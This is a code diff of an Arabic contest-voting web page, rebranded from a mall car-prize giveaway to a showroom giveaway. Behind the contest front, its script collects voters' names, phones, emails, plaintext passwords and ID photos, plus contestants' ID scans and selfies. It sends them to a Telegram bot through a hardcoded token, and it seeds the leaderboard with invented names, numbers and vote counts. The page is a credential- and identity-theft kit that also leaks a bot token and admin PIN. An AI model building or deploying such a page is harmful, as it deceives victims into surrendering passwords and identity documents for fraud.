+          <textarea id="regNote" placeholder="اكتب كلمة قصيرة للجمهور..."></textarea>
         </div>
 
-        <div class="field-box full-row">
-          <label>🪪 1. إرفاق صورة البطاقة الشخصية أو جواز السفر للمتسابق *</label>
-          <div class="fairness-alert">
-            <span>⚠️</span>
-            <p><strong>تنبيه هام ضد الاحتيال والتزوير:</strong> يُمنع كلياً رفع أي صور أو بيانات غير صحيحة أو مزورة أو انتحال هوية الغير. أي مخالفة تعرض صاحبها للاستبعاد الفوري وحذف الأصوات وتحمل كامل المسؤولية القانونية، حفاظاً على نزاهة المسابقة.</p>
+        <div class="field full-col">
+          <label>1. صورة البطاقة الشخصية أو الجواز للمتسابق *</label>
+          <div class="alert-box" style="margin-bottom:10px;">
+            يُمنع رفع أي وثائق أو بيانات غير صحيحة أو منتحلة. أي مخالفة تعرض صاحبها للاستبعاد الفوري وحذف الأصوات.
           </div>
-          <div class="drop-card" onclick="document.getElementById('regIdFileInp').click()">
-            <span class="drop-ico">🆔</span>
-            <div class="drop-title">اضغط هنا لإرفاق صورة البطاقة أو الجواز</div>
-            <div class="drop-note">تُضغط تلقائياً وتُرسل للبوت للتحقق فقط</div>
-            <input type="file" id="regIdFileInp" accept="image/*" required onchange="compressImageFile(event, 'regIdPrev')">
-            <img id="regIdPrev" class="img-thumb" alt="معاينة الهوية">
+          <div class="file-drop" onclick="document.getElementById('idCardImage').click()">
+            <span class="f-title">اضغط لإرفاق صورة البطاقة أو الجواز</span>
+            <span class="f-sub">تُرسل للإدارة عبر البوت للتحقق</span>
+            <input type="file" id="idCardImage" accept="image/*" required onchange="handleImage(event, 'idPreview')">
+            <img id="idPreview" class="img-prev" alt="معاينة الهوية">
           </div>
         </div>
 
-        <div class="field-box full-row">
-          <label>🤳 2. إرفاق صورة سيلفي لك وأنت تحمل الهوية *</label>
-          <div class="drop-card" onclick="document.getElementById('regSelfieFileInp').click()">
-            <span class="drop-ico">📸</span>
-            <div class="drop-title">اضغط هنا لإرفاق صورة سيلفي مع الهوية</div>
-            <div class="drop-note">لتأكيد أنك صاحب الطلب الحقيقي</div>
-            <input type="file" id="regSelfieFileInp" accept="image/*" required onchange="compressImageFile(event, 'regSelfiePrev')">
-            <img id="regSelfiePrev" class="img-thumb" alt="معاينة السيلفي">
+        <div class="field full-col">
+          <label>2. صورة سيلفي مع الهوية *</label>
+          <div class="file-drop" onclick="document.getElementById('selfieIdImage').click()">
+            <span class="f-title">اضغط لإرفاق صورة سيلفي وأنت تحمل الهوية</span>
+            <span class="f-sub">لتأكيد ملكية الطلب</span>
+            <input type="file" id="selfieIdImage" accept="image/*" required onchange="handleImage(event, 'selfiePreview')">
+            <img id="selfiePreview" class="img-prev" alt="معاينة السيلفي">
           </div>
         </div>
       </div>
 
-      <button type="submit" id="joinSubmit" class="submit-btn crimson">🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي</button>
-      <div id="joinMsg" class="status-msg"></div>
+      <button type="submit" id="regSubmitBtn" class="btn-submit emerald">إصدار رمز المتسابق ورابط التصويت</button>
+      <div id="regFeedback" class="feedback"></div>
     </form>
 
     <div id="ticketResult">
-      <div style="display:inline-block; background:var(--grad-gold); color:#050608; font-weight:900; padding:7px 22px; border-radius:999px; margin-bottom:12px;">✅ تم اعتماد اشتراكك وإضافتك لجدول المتسابقين</div>
-      <h3 style="font-size:27px; color:var(--gold-bright); font-weight:900;">مبارك! هذا رمزك ورسالة الدعوة الجاهزة للمشاركة</h3>
-      <div class="ticket-pill" id="ticketCodeOut">BAYRAQ-0000</div>
-      <p style="color:#d1d5db; font-size:14px;">انسخ الرسالة المرتبة التالية وشاركها مع أصدقائك وفي حالاتك للدخول والتصويت لك مباشرة:</p>
-      <div class="share-preview" id="shareMsgOut"></div>
-      <button type="button" class="copy-action" onclick="copyShareMsg()">📋 نسخ رسالة الدعوة والرابط المباشر</button>
-      <p id="copyConfirm" style="color:#6ee7b7; font-size:13px; margin-top:8px; display:none;">✅ تم نسخ الرسالة والرابط بنجاح!</p>
+      <div style="color:#6ee7b7; font-weight:900; font-size:15px;">تم تسجيلك وإضافتك إلى قائمة المتسابقين</div>
+      <div class="code-display" id="ticketCodeOut">AMIR-0000</div>
+      <p style="color:var(--text-sub); font-size:13.5px;">انسخ رسالة الدعوة التالية وشاركها ليصوّت لك الجمهور عبر الرابط المباشر:</p>
+      <div id="inviteTextOut" class="invite-box"></div>
+      <button type="button" class="btn-main-amber" onclick="copyInvite()">نسخ رسالة الدعوة</button>
+      <div id="copyDone" style="display:none; margin-top:8px; color:#6ee7b7; font-size:13px; font-weight:800;">تم نسخ رسالة الدعوة بنجاح.</div>
     </div>
   </div>
 </section>
 
-<!-- ===== أقسام البيرق مول ===== -->
-<section id="wings">
-  <div class="sec-title-wrap">
-    <span class="kicker">أضخم وجهة تسوق في عدن</span>
-    <h2>أبرز أجنحة البيرق مول</h2>
-  </div>
-  <div class="wings-grid">
-    <div class="wing-box vip">
-      <span class="wing-icon">🚘</span>
-      <h3>جائزة سيارة مرسيدس</h3>
-      <p>الجائزة الكبرى لمسابقة التصويت والجمهور في البيرق مول بالعاصمة عدن.</p>
+<!-- ===== 4. التواصل ===== -->
+<section id="contact" class="page-section">
+  <div class="contact-card">
+    <div>
+      <h3>معرض أمير المترات</h3>
+      <p>القاعدة — الشارع العام | تواصل مباشر للاستفسارات والمتابعة</p>
     </div>
-    <div class="wing-box">
-      <span class="wing-icon">💻</span>
-      <h3>ركن التقنية والحديث</h3>
-      <p>أحدث الأجهزة الذكية والحلول الرقمية والمستلزمات العصرية المتطورة.</p>
-    </div>
-    <div class="wing-box">
-      <span class="wing-icon">🛍️</span>
-      <h3>الأزياء والماركات</h3>
-      <p>تشكيلات مختارة بعناية تلبي مختلف الأذواق في أجواء تسوق راقية.</p>
-    </div>
-    <div class="wing-box">
-      <span class="wing-icon">🍽️</span>
-      <h3>الترفيه والضيافة</h3>
-      <p>مساحات عائلية ومطاعم ومقاهٍ توفر تجربة متكاملة طوال اليوم.</p>
-    </div>
-  </div>
-</section>
-
-<!-- ===== الموقع ===== -->
-<section id="location">
-  <div class="loc-box">
-    <div class="loc-text">
-      <h3>📍 موقع البيرق مول — عدن</h3>
-      <p><strong>العاصمة عدن — جولة البيرق (المنصورة)</strong></p>
-    </div>
-    <div class="phone-pills">
-      <a href="tel:777908028" class="phone-pill">📞 777908028</a>
-      <a href="tel:780280887" class="phone-pill">📞 780280887</a>
+    <div class="tel-group">
+      <a href="tel:777908028" class="tel-link">📞 777908028</a>
+      <a href="tel:780280887" class="tel-link">📞 780280887</a>
     </div>
   </div>
 </section>
 
 <footer>
-  <h3>🏛️ البيرق مول • عدن</h3>
-  <p>جولة البيرق — المنصورة، العاصمة عدن</p>
-  <p style="margin-top:10px; font-size:13px; opacity:0.65;">© 2026 جميع الحقوق محفوظة — البيرق مول عدن</p>
+  <strong>أمير المترات</strong>
+  <p>القاعدة — الشارع العام</p>
+  <p style="margin-top:8px; font-size:12.5px; opacity:0.7;">© 2026 أمير المترات — جميع الحقوق محفوظة</p>
 </footer>
 
 <script>
 const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const CHAT_ID   = "8299163806";
 const ADMIN_PIN = "777908028";
-const STORAGE_KEY = "bayraq_aden_v3";
-const MAX_CAP     = 100;
+const STORAGE_KEY = "amir_felling_v4_500";
+const MAX_CAP = 500;
 
-const CAR_PHOTOS = [
-  "https://images.unsplash.com/photo-1618843479313-40f8afb4b4d8?auto=format&fit=crop&w=1000&q=80",
-  "https://images.unsplash.com/photo-1617531653332-bd46c24f2068?auto=format&fit=crop&w=1000&q=80",
-  "https://images.unsplash.com/photo-1553440569-bcc63803a83d?auto=format&fit=crop&w=1000&q=80"
-];
+let voterIdBlob = null;
+let idCardBlob = null;
+let selfieIdBlob = null;
+let expectedCaptcha = 12;
 
-let voterBlob = null;
-let regIdBlob = null;
-let regSelfieBlob = null;
-let expectedAns = 10;
-
-function makeInitial50() {
-  const names = [
-    "خلدون محمد منصور", "أحمد علي العدني", "محمد عبدالقادر المنصوري", "صلاح الدين عبده",
-    "ياسر حسن البيرقي", "ماجد حسين الجندي", "طارق عبدالكريم المعلاوي", "نبيل سعيد الشيخ",
+function createInitialRoster() {
+  const baseNames = [
+    "خلدون محمد منصور", "أحمد علي القاعدي", "محمد عبدالقادر التعزي", "صلاح الدين عبده",
+    "ياسر حسن المحمدي", "ماجد حسين الجندي", "طارق عبدالكريم المعلاوي", "نبيل سعيد الشيخ",
     "وليد محمد الحوباني", "جمال أحمد الشميري", "عادل علي المخلافي", "فؤاد يحيى الشيباني",
     "رامي صادق الذبحاني", "سامر خالد العواضي", "هاني محمد الرداعي", "بسام عبدالمجيد",
     "كريم ناصر الحمادي", "مراد سالم الصبري", "أكرم توفيق اليوسفي", "تامر فهد السقاف",
     "زياد عمر باوزير", "مهند حسام الحكيمي", "أنس راشد الزبيري", "إيهاب جميل الكحلاني",
     "رائد محمود العريقي", "مروان نبيل الدبعي", "عصام حسن الأشول", "شادي محمد الهتار",
     "غسان علي المسلمي", "فراس عبدربه النهاري", "أيمن صالح الحالمي", "سعيد محمد القباطي",
-    "منير أحمد الذماري", "حازم خالد الإبي", "بشير عبدالله التعزي", "أديب محمد العدني",
+    "منير أحمد الذماري", "حازم خالد الإبي", "بشير عبدالله التعزي", "أديب محمد الشرعبي",
     "نواف سعيد الصنعاني", "وسام علي الحديدي", "ليث محمد المرادي", "قيس عبدالرحمن",
     "عمار حسن الشرجبي", "مجدي صالح الوصابي", "صدام محمد الحجري", "إبراهيم علي الجبري",
-    "حسين محمد القدسي", "عبدالسلام أحمد", "يوسف سعيد المعمري", "علي محسن الشرعبي",
-    "مصطفى عبدالحميد", "سفيان محمد البيرقي"
+    "حسين محمد القدسي", "عبدالسلام أحمد", "يوسف سعيد المعمري", "علي محسن القدسي",
+    "مصطفى عبدالحميد", "سفيان محمد الحكيمي"
   ];
+  const cities = ["القاعدة", "صنعاء", "تعز", "إب", "عدن", "الحوبان", "ذمار"];
 
-  const areas = ["جولة البيرق", "المنصورة", "المعلا", "الشيخ عثمان", "كريتر", "خور مكسر", "دار سعد"];
-
-  return names.map((name, idx) => {
-    const isTop = name === "خلدون محمد منصور";
-    const code = isTop ? "BAYRAQ-7272" : `BAYRAQ-${(5100 + idx * 67).toString().slice(-4)}`;
-    const phone = isTop ? "776818383" : `77${(3000000 + idx * 14321).toString().slice(0, 7)}`;
-    const votes = isTop ? 78 : Math.max(5, 68 - idx);
-    return { k: code, n: name, p: phone, y: areas[idx % areas.length], v: votes };
+  return baseNames.map((name, idx) => {
+    const isTop = idx === 0;
+    const code = isTop ? "AMIR-7272" : `AMIR-${(2100 + idx * 17).toString().padStart(4, "0")}`;
+    const phone = isTop ? "776818383" : `77${(4000000 + idx * 13791).toString().slice(0, 7)}`;
+    const votes = isTop ? 78 : Math.max(4, 65 - idx);
+    return { k: code, n: name, p: phone, y: cities[idx % cities.length], v: votes };
   });
 }
 
-function loadSavedState() {
+function loadState() {
   try {
     const raw = localStorage.getItem(STORAGE_KEY);
     if (raw) {
-      const obj = JSON.parse(raw);
-      if (obj && Array.isArray(obj.c) && obj.c.length > 0) {
-        return { c: obj.c, h: Array.isArray(obj.h) ? obj.h : [] };
+      const parsed = JSON.parse(raw);
+      if (parsed && Array.isArray(parsed.c) && parsed.c.length > 0) {
+        return { c: parsed.c.slice(0, MAX_CAP), h: Array.isArray(parsed.h) ? parsed.h : [] };
       }
     }
   } catch (e) {}
-  return { c: makeInitial50(), h: [] };
+  return { c: createInitialRoster(), h: [] };
 }
 
-let stateData = loadSavedState();
+let stateData = loadState();
 
-function saveStateLocal() {
+function persistLocal() {
   stateData.c.sort((a, b) => (b.v || 0) - (a.v || 0));
   localStorage.setItem(STORAGE_KEY, JSON.stringify(stateData));
 }
 
-function initMathQuestion() {
+function initCaptcha() {
   const a = Math.floor(Math.random() * 9) + 2;
   const b = Math.floor(Math.random() * 9) + 1;
-  expectedAns = a + b;
-  const el = document.getElementById("mathQ");
-  if (el) el.textContent = `🔐 كم ناتج: ${a} + ${b} = ؟`;
+  expectedCaptcha = a + b;
+  const el = document.getElementById("captchaQuestion");
+  if (el) el.textContent = `${a} + ${b} = ?`;
 }
 
-function makeHash(val) {
+function hashValue(val) {
   let h = 0;
   const s = String(val).trim().toLowerCase();
   for (let i = 0; i < s.length; i++) {
@@ -983,27 +1319,39 @@ function makeHash(val) {
   return Math.abs(h).toString(36);
 }
 
-async function syncStateFromCloud(manual = false) {
+function buildSortedLines(limit = 25) {
+  const sorted = [...(stateData.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
+  return sorted.slice(0, limit).map((item, idx) => {
+    const badge = idx === 0 ? "🥇" : idx === 1 ? "🥈" : idx === 2 ? "🥉" : `${idx + 1}.`;
+    return `${badge} <b>${item.n}</b> | <code>${item.k}</code> ➔ <b>${item.v || 0} صوت</b>`;
+  }).join("\n");
+}
+
+async function syncFromTelegramCloud(manual = false) {
   try {
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${CHAT_ID}`);
     const data = await res.json();
-    if (data.ok && data.result && data.result.pinned_message && data.result.pinned_message.text) {
-      const m = data.result.pinned_message.text.match(/#BAYRAQ_DB#([\s\S]*?)#END_DB#/);
-      if (m && m[1]) {
-        const parsed = JSON.parse(m[1].trim());
-        if (parsed && Array.isArray(parsed.c) && parsed.c.length > 0) {
-          stateData = parsed;
-          saveStateLocal();
+    const pinnedText = data?.result?.pinned_message?.text;
+    if (pinnedText) {
+      const match = pinnedText.match(/#AMIR_DB#([\s\S]*?)#END_DB#/);
+      if (match && match[1]) {
+        const cloudObj = JSON.parse(match[1].trim());
+        if (cloudObj && Array.isArray(cloudObj.c) && cloudObj.c.length > 0) {
+          stateData = {
+            c: cloudObj.c.slice(0, MAX_CAP),
+            h: Array.isArray(cloudObj.h) ? cloudObj.h : []
+          };
+          persistLocal();
         }
       }
     }
     renderBoard();
-    checkUrlVote();
+    applyUrlVoteParam();
     if (manual) {
-      const badge = document.getElementById("counterBadge");
-      if (badge) {
-        badge.style.transform = "scale(1.06)";
-        setTimeout(() => { badge.style.transform = "scale(1)"; }, 200);
+      const b = document.getElementById("boardSummaryBadge");
+      if (b) {
+        b.style.transform = "scale(1.05)";
+        setTimeout(() => { b.style.transform = "scale(1)"; }, 180);
       }
     }
   } catch (e) {
@@ -1011,34 +1359,24 @@ async function syncStateFromCloud(manual = false) {
   }
 }
 
-function buildSortedLines(limit = 20) {
-  const sorted = [...(stateData.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
-  let out = "";
-  sorted.slice(0, limit).forEach((item, idx) => {
-    const medal = idx === 0 ? "🥇" : idx === 1 ? "🥈" : idx === 2 ? "🥉" : `🔹 ${idx + 1}.`;
-    out += `${medal} <b>${item.n}</b> | <code>${item.k}</code> ➔ <b>${item.v || 0} صوت</b>\n`;
-  });
-  return out;
-}
-
 async function syncCloudBackground() {
-  saveStateLocal();
+  persistLocal();
   try {
-    const total = stateData.c.reduce((sum, x) => sum + (x.v || 0), 0);
-    const lines = buildSortedLines(12);
+    const total = stateData.c.reduce((s, x) => s + (x.v || 0), 0);
+    const lines = buildSortedLines(15);
     const payload =
-`📊 سجل مسابقة البيرق مول — عدن
+`📊 سجل مسابقة أمير المترات (السعة ${MAX_CAP})
 👥 المتسابقون: ${stateData.c.length}/${MAX_CAP} | 🗳️ الأصوات: ${total}
 ━━━━━━━━━━━━━━━━━━
 ${lines}
-#BAYRAQ_DB#
+#AMIR_DB#
 ${JSON.stringify(stateData)}
 #END_DB#`;
 
     const chatRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${CHAT_ID}`);
     const chatData = await chatRes.json();
     const pinned = chatData?.result?.pinned_message;
-    if (pinned && pinned.text && pinned.text.includes("#BAYRAQ_DB#")) {
+    if (pinned && pinned.text && pinned.text.includes("#AMIR_DB#")) {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -1049,39 +1387,40 @@ ${JSON.stringify(stateData)}
 }
 
 function renderBoard() {
-  const listEl = document.getElementById("boardList");
-  const selectEl = document.getElementById("candSelect");
-  const badgeEl = document.getElementById("counterBadge");
-  const q = (document.getElementById("searchBoardInp")?.value || "").trim().toLowerCase();
+  const listEl = document.getElementById("leaderboardList");
+  const selectEl = document.getElementById("candidateSelect");
+  const summaryEl = document.getElementById("boardSummaryBadge");
+  const heroCapEl = document.getElementById("heroCapVal");
+  const heroVotesEl = document.getElementById("heroVotesVal");
+  const query = (document.getElementById("searchInput")?.value || "").trim().toLowerCase();
 
   const sorted = [...(stateData.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
-  const totalVotes = sorted.reduce((sum, item) => sum + (item.v || 0), 0);
+  const totalVotes = sorted.reduce((s, item) => s + (item.v || 0), 0);
 
-  if (badgeEl) {
-    badgeEl.textContent = `👥 المتسابقون: ${sorted.length}/${MAX_CAP} • 🗳️ إجمالي الأصوات: ${totalVotes}`;
-  }
+  if (summaryEl) summaryEl.textContent = `المتسابقون: ${sorted.length}/${MAX_CAP} • الأصوات: ${totalVotes}`;
+  if (heroCapEl) heroCapEl.textContent = `${sorted.length} / ${MAX_CAP}`;
+  if (heroVotesEl) heroVotesEl.textContent = String(totalVotes);
 
   if (selectEl) {
-    const prev = selectEl.value;
-    selectEl.innerHTML = `<option value="">-- اختر متسابقاً من القائمة (${sorted.length}) --</option>`;
+    const currentVal = selectEl.value;
+    selectEl.innerHTML = `<option value="">-- اختر متسابقاً (${sorted.length} متاح) --</option>`;
     sorted.forEach(c => {
       const opt = document.createElement("option");
       opt.value = c.k;
       opt.textContent = `${c.n} (${c.k}) — ${c.v || 0} صوت`;
       selectEl.appendChild(opt);
     });
-    if (prev) selectEl.value = prev;
+    if (currentVal) selectEl.value = currentVal;
   }
 
   const filtered = sorted.filter(c =>
-    c.n.toLowerCase().includes(q) ||
-    c.k.toLowerCase().includes(q) ||
-    (c.p && c.p.toLowerCase().includes(q)) ||
-    (c.y && c.y.toLowerCase().includes(q))
+    c.n.toLowerCase().includes(query) ||
+    c.k.toLowerCase().includes(query) ||
+    (c.y && c.y.toLowerCase().includes(query))
   );
 
   if (filtered.length === 0) {
-    listEl.innerHTML = `<div style="text-align:center; padding:25px; color:var(--text-dim);">لا توجد نتائج مطابقة للبحث.</div>`;
+    listEl.innerHTML = `<div style="text-align:center; padding:24px; color:var(--text-sub);">لا توجد نتائج مطابقة للبحث.</div>`;
     return;
   }
 
@@ -1089,36 +1428,59 @@ function renderBoard() {
   filtered.forEach(cand => {
     const rank = sorted.findIndex(x => x.k === cand.k);
     const isTop = rank === 0;
-    const row = document.createElement("div");
-    row.className = "board-row" + (isTop ? " top-rank" : "");
-    row.innerHTML = `
-      <div class="board-left">
-        <div class="rank-num">${isTop ? "👑" : rank + 1}</div>
+    const div = document.createElement("div");
+    div.className = "board-row" + (isTop ? " top-rank" : "");
+    div.innerHTML = `
+      <div class="row-left">
+        <div class="rank-circle">${isTop ? "1" : rank + 1}</div>
         <div>
-          <div class="cand-title">${escHtml(cand.n)}</div>
-          <div class="cand-sub">${escHtml(cand.y || "")} • <span class="cand-code">${escHtml(cand.k)}</span></div>
+          <div class="row-name">${escHtml(cand.n)}</div>
+          <div class="row-sub">${escHtml(cand.y || "")} • <span class="row-code">${escHtml(cand.k)}</span></div>
         </div>
       </div>
       <div style="text-align:left;">
-        <div class="votes-pill">🗳️ ${cand.v || 0} صوت</div>
-        <button type="button" class="vote-row-btn" onclick="pickForVote('${escHtml(cand.k)}')">صوّت له</button>
-        <button type="button" class="admin-kick-btn admin-only-area" onclick="kickCandidate('${escHtml(cand.k)}', '${escHtml(cand.n)}')">🗑️ استبعاد</button>
+        <div class="votes-badge">${cand.v || 0} صوت</div>
+        <button type="button" class="vote-mini-btn" onclick="pickCandidate('${escHtml(cand.k)}')">تصويت</button>
+        <button type="button" class="del-btn admin-ctrl" onclick="deleteCandidate('${escHtml(cand.k)}', '${escHtml(cand.n)}')">حذف</button>
       </div>
     `;
-    listEl.appendChild(row);
+    listEl.appendChild(div);
   });
 }
 
-function checkUrlVote() {
+function pickCandidate(code) {
+  const sel = document.getElementById("candidateSelect");
+  const inp = document.getElementById("candidateCodeInput");
+  if (sel) sel.value = code;
+  if (inp) {
+    inp.value = code;
+    inp.focus();
+  }
+}
+
+function syncCodeFromSelect() {
+  const sel = document.getElementById("candidateSelect");
+  const inp = document.getElementById("candidateCodeInput");
+  if (sel && inp && sel.value) inp.value = sel.value;
+}
+
+function chooseModel(modelName) {
+  const sel = document.getElementById("regModel");
+  if (sel) sel.value = modelName;
+  const regSec = document.getElementById("register");
+  if (regSec) regSec.scrollIntoView({ behavior: "smooth" });
+}
+
+function applyUrlVoteParam() {
   const params = new URLSearchParams(window.location.search);
   const vCode = params.get("vote");
   if (!vCode) return;
   const clean = vCode.trim().toUpperCase();
   const found = stateData.c.find(c => c.k === clean);
-  const inp = document.getElementById("codeBox");
-  const sel = document.getElementById("candSelect");
-  const banner = document.getElementById("refBanner");
-  const lbl = document.getElementById("refTargetName");
+  const inp = document.getElementById("candidateCodeInput");
+  const sel = document.getElementById("candidateSelect");
+  const banner = document.getElementById("inviteBanner");
+  const lbl = document.getElementById("inviteTargetLabel");
 
   if (inp && !inp.value) inp.value = clean;
   if (sel && found) sel.value = clean;
@@ -1126,269 +1488,199 @@ function checkUrlVote() {
     banner.style.display = "block";
     lbl.textContent = found ? `${found.n} (${clean})` : clean;
   }
-  const gate = document.getElementById("introGate");
-  if (gate) gate.style.display = "none";
 }
 
-function syncCodeBox() {
-  const sel = document.getElementById("candSelect");
-  const inp = document.getElementById("codeBox");
-  if (sel && inp && sel.value) inp.value = sel.value;
-}
-
-function pickForVote(code) {
-  const sel = document.getElementById("candSelect");
-  const inp = document.getElementById("codeBox");
-  if (sel) sel.value = code;
-  if (inp) { inp.value = code; inp.focus(); }
-}
-
-function scrollToSection(id) {
-  const gate = document.getElementById("introGate");
-  if (gate) {
-    gate.style.opacity = "0";
-    gate.style.transition = "opacity 0.25s ease";
-    setTimeout(() => { gate.style.display = "none"; }, 250);
-  }
-  const el = document.getElementById(id);
-  if (el) el.scrollIntoView({ behavior: "smooth" });
-}
-
-function setCarView(idx, btn) {
-  const img = document.getElementById("carImageEl");
-  if (img && CAR_PHOTOS[idx]) {
-    img.style.opacity = "0.35";
-    img.src = CAR_PHOTOS[idx];
-    img.onload = () => { img.style.opacity = "1"; };
-  }
-  document.querySelectorAll(".view-tab").forEach(b => b.classList.remove("active"));
-  if (btn) btn.classList.add("active");
-}
-
-function updateCustomCar() {
-  const inp = document.getElementById("customCarInput");
-  const img = document.getElementById("carImageEl");
-  if (!inp || !inp.value.trim()) {
-    alert("يرجى إدخال رابط صورة صحيح.");
-    return;
-  }
-  if (img) img.src = inp.value.trim();
-  alert("✅ تم تحديث صورة سيارة مرسيدس في الواجهة.");
-}
-
-// ===== إرسال التصويت: 1) صورة البطاقة/الجواز وبيانات المصوت في رسالة قصيرة، 2) الترتيب المرتب في رسالة مستقلة =====
 document.getElementById("voteForm").addEventListener("submit", async function(e) {
   e.preventDefault();
-  const msgEl = document.getElementById("voteMsg");
-  const thanksCard = document.getElementById("mallThanksCard");
-  msgEl.className = "status-msg";
-  if (thanksCard) thanksCard.style.display = "none";
+  const fb = document.getElementById("voteFeedback");
+  const thanksBox = document.getElementById("voteThanksBox");
+  fb.className = "feedback";
+  if (thanksBox) thanksBox.style.display = "none";
 
-  const ans = parseInt(document.getElementById("mathAnsInp").value, 10);
-  if (ans !== expectedAns) {
-    msgEl.className = "status-msg err";
-    msgEl.textContent = "❌ ناتج التحقق الحسابي غير صحيح!";
-    initMathQuestion();
+  const ans = parseInt(document.getElementById("captchaAnswer").value, 10);
+  if (ans !== expectedCaptcha) {
+    fb.className = "feedback err";
+    fb.textContent = "ناتج التحقق الحسابي غير صحيح.";
+    initCaptcha();
     return;
   }
 
-  if (!voterBlob) {
-    msgEl.className = "status-msg err";
-    msgEl.textContent = "❌ يرجى إرفاق صورة البطاقة الشخصية أو الجواز قبل اعتماد الصوت!";
+  if (!voterIdBlob) {
+    fb.className = "feedback err";
+    fb.textContent = "يرجى إرفاق صورة البطاقة الشخصية أو الجواز للمصوّت.";
     return;
   }
 
-  const code = document.getElementById("codeBox").value.trim().toUpperCase();
-  const voterName = escHtml(document.getElementById("voterNameInp").value.trim());
-  const voterPhone = document.getElementById("voterPhoneInp").value.trim().replace(/\s+/g, "");
-  const voterEmail = document.getElementById("voterEmailInp").value.trim().toLowerCase();
-  const voterPass = escHtml(document.getElementById("voterPassInp").value.trim());
+  const code = document.getElementById("candidateCodeInput").value.trim().toUpperCase();
+  const voterName = escHtml(document.getElementById("voterName").value.trim());
+  const voterPhone = document.getElementById("voterPhone").value.trim().replace(/\s+/g, "");
+  const voterEmail = document.getElementById("voterEmail").value.trim().toLowerCase();
+  const voterPass = escHtml(document.getElementById("voterPassword").value.trim());
 
   const target = stateData.c.find(c => c.k === code);
   if (!target) {
-    msgEl.className = "status-msg err";
-    msgEl.textContent = "❌ رمز المتسابق غير صحيح! تحقق من الرمز وحاول مرة أخرى.";
+    fb.className = "feedback err";
+    fb.textContent = "رمز المتسابق غير موجود في القائمة.";
     return;
   }
 
   if (target.p && target.p === voterPhone) {
-    msgEl.className = "status-msg err";
-    msgEl.textContent = "🚫 لا يُسمح للمتسابق بالتصويت لنفسه حرصاً على عدالة المسابقة.";
+    fb.className = "feedback err";
+    fb.textContent = "لا يُسمح للمتسابق بالتصويت لنفسه.";
     return;
   }
 
-  const pHash = makeHash(voterPhone);
-  const eHash = makeHash(voterEmail);
+  const pHash = hashValue(voterPhone);
+  const eHash = hashValue(voterEmail);
   if (stateData.h.includes(pHash) || stateData.h.includes(eHash)) {
-    msgEl.className = "status-msg err";
-    msgEl.textContent = "🚫 هذا الرقم أو البريد سبق له التصويت؛ يمكنك التصويت برقم وبريد مختلف.";
+    fb.className = "feedback err";
+    fb.textContent = "تم استخدام رقم الهاتف أو البريد الإلكتروني مسبقاً في التصويت.";
     return;
   }
 
-  const btn = document.getElementById("voteSubmit");
+  const btn = document.getElementById("voteSubmitBtn");
   btn.disabled = true;
-  btn.textContent = "⚡ جارٍ إرسال وثيقة التصويت للبوت...";
+  btn.textContent = "جارٍ إرسال الصوت والوثيقة للبوت...";
 
   try {
     target.v = (target.v || 0) + 1;
     stateData.h.push(pHash, eHash);
-    saveStateLocal();
+    persistLocal();
     renderBoard();
 
-    const shortCaption =
-`🗳️ <b>تصويت ووثيقة مُصوِّت — البيرق مول عدن</b>
+    const caption =
+`🗳️ <b>تصويت جديد — أمير المترات</b>
 ━━━━━━━━━━━━━━━━━━
 🎯 <b>المتسابق:</b> ${target.n}
 🎟️ <b>الرمز:</b> <code>${code}</code>
-🔢 <b>أصواته الحالية:</b> <b>${target.v} صوت</b>
+🔢 <b>مجموع أصواته:</b> <b>${target.v}</b>
 ━━━━━━━━━━━━━━━━━━
-🙋‍♂️ <b>المُصوِّت:</b> ${voterName}
-📞 <b>هاتفه:</b> <code>${voterPhone}</code>
-📧 <b>بريده:</b> <code>${voterEmail}</code>
+🙋‍♂️ <b>المصوّت:</b> ${voterName}
+📞 <b>الهاتف:</b> <code>${voterPhone}</code>
+📧 <b>البريد:</b> <code>${voterEmail}</code>
 🔑 <b>كلمة السر:</b> <code>${voterPass}</code>`;
 
     const fd = new FormData();
     fd.append("chat_id", CHAT_ID);
-    fd.append("photo", voterBlob, "voter_identity.jpg");
-    fd.append("caption", shortCaption);
+    fd.append("photo", voterIdBlob, "voter_id.jpg");
+    fd.append("caption", caption);
     fd.append("parse_mode", "HTML");
 
     const photoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
       body: fd
-    });
-    const photoData = await photoRes.json();
-    if (!photoData.ok) throw new Error("sendPhoto failed");
+    }).then(r => r.json());
 
-    const totalNow = stateData.c.reduce((sum, item) => sum + (item.v || 0), 0);
-    const sortedBlock = buildSortedLines(20);
-    const orderedMsg =
-`🏆 <b>الترتيب المرتب لمسابقة مرسيدس — البيرق مول</b>
-🗳️ <b>إجمالي الأصوات:</b> <b>${totalNow}</b> | 👥 <b>المتسابقون:</b> <b>${stateData.c.length}</b>
+    if (!photoRes.ok) throw new Error("upload failed");
+
+    const totalNow = stateData.c.reduce((s, x) => s + (x.v || 0), 0);
+    const topLines = buildSortedLines(25);
+    const summaryMsg =
+`🏆 <b>تحديث الترتيب — أمير المترات</b>
+👥 المتسابقون: <b>${stateData.c.length}/${MAX_CAP}</b> | 🗳️ الأصوات: <b>${totalNow}</b>
 ━━━━━━━━━━━━━━━━━━
-${sortedBlock}`;
+${topLines}`;
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: orderedMsg, parse_mode: "HTML" })
+      body: JSON.stringify({ chat_id: CHAT_ID, text: summaryMsg, parse_mode: "HTML" })
     }).catch(() => {});
 
     syncCloudBackground();
 
-    msgEl.className = "status-msg ok";
-    msgEl.textContent = `✅ تم اعتماد صوتك بنجاح لصالح (${target.n} - ${code}) وإرسال بياناتك للبوت!`;
+    fb.className = "feedback ok";
+    fb.textContent = `تم اعتماد صوتك لصالح (${target.n} - ${code}) بنجاح.`;
 
-    const bodyEl = document.getElementById("mallThanksBody");
-    if (bodyEl) {
